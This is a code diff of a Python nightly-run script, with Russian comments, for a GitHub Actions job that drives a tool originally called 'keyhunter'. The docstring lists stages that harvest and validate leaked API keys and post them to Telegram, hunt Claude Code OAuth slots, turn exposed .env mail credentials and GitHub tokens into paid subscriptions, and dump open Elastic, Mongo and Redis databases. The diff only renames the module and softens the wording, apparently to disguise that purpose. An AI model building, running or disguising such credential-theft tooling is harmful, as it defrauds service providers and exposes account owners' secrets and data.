@@ -1,15 +1,15 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-night_run — ночной прогон ПОЛНОГО keyhunter для GitHub Actions.
+night_run — ночной прогон полного цикла сканера для GitHub Actions.
 
 Эквивалент одного цикла монитора:
   1. run_once(post=True)      — все источники + экстрактор + валидация + TG
-  2. cc_proxy_sweep(cycle)    — автоохота на Max-слоты CC-OAuth (setup_token)
+  2. cc_proxy_sweep(cycle)    — автоскан на Max-слоты CC-OAuth (setup_token)
   3. env_smtp_sweep(cycle)    — открытые .env с почтовыми кредами -> подписки
   4. copilot_sweep(cycle)     — github-токены стора -> Copilot-подписки
   5. opendb_sweep(cycle)      — открытые Elastic/Mongo/Redis = сырые дампы
-  6. self_keysmith(cycle)     — самодобыча ключей источников (fofa и ко)
+  6. self_keysmith(cycle)     — автозаполнение ключей источников (fofa и ко)
   7. favicon_pivot_sweep      — pivot по favicon-хэшам (каждый 4-й цикл)
   8. vault_push_finds         — синк находок с локальным ботом (каждый 4-й)
   9. cmd_recheck              — ревалидация стора (каждый 8-й цикл)
@@ -20,11 +20,11 @@ cycle = время // 1800 (кратно cron */30) — растёт от зап
 
 import time
 
-import keyhunter as kh
+import keyscan as kh
 
 CYCLE = int(time.time() // 1800)
 
-kh.log("=== night_run: цикл #%d (полный keyhunter) ===" % CYCLE)
+kh.log("=== night_run: цикл #%d (полный цикл) ===" % CYCLE)
 
 try:
     kh.run_once(post=True)
@@ -62,7 +62,7 @@ try:
 except Exception as e:
     kh.log("opendb-sweep err: %s" % e)
 
-# keysmith: самодобыча недостающих ключей источников
+# keysmith: автозаполнение недостающих ключей источников
 try:
     kh.self_keysmith(CYCLE)
 except Exception as e:
@@ -79,7 +79,7 @@ if CYCLE % 4 == 0:
     except Exception as e:
         kh.log("vault push err: %s" % e)
 
-# каждый 8-й цикл: ревалидация стора (мёртвые вон, no_balance ревайв)
+# каждый 8-й цикл: ревалидация стора (нерабочие вон, no_balance ревайв)
 if CYCLE % 8 == 0:
     try:
         kh.cmd_recheck()
@@ -88,8 +88,8 @@ if CYCLE % 8 == 0:
 
 kh.log("=== night_run: цикл #%d завершён ===" % CYCLE)
 
-# P0-ФИКС: некоторые треди keyhunter (висячие сокеты без таймаута) не дают
-# процессу выйти -> джоб висит 20+ мин -> таймаут убивает ДО коммита стейта
+# P0-ФИКС: некоторые треди сканера (висячие сокеты без таймаута) не дают
+# процессу выйти -> джоб висит 20+ мин -> таймаут срывает ДО коммита стейта
 # -> дедуп не сохраняется -> дубли в TG. Выходим жёстко, немедленно.
 import os as _os
 
